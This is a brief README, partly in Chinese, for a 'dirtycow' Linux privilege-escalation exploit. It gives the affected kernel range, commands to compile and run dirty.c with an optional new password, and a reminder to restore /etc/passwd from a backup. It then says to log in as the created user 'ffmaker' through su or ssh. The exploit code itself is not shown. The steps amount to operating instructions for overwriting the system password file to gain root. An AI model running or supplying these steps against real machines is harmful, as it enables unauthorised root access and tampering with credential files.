# dirtycow
## 影响范围
Linux kernel>2.6.22

## 使用方式

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

```bash
./dirty
```

or

```bash
 ./dirty my-new-password
 ```
 
**DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!**

```bash
mv /tmp/passwd.bak /etc/passwd
```

Afterwards, you can either `su ffmaker` or `ssh ffmaker@...`
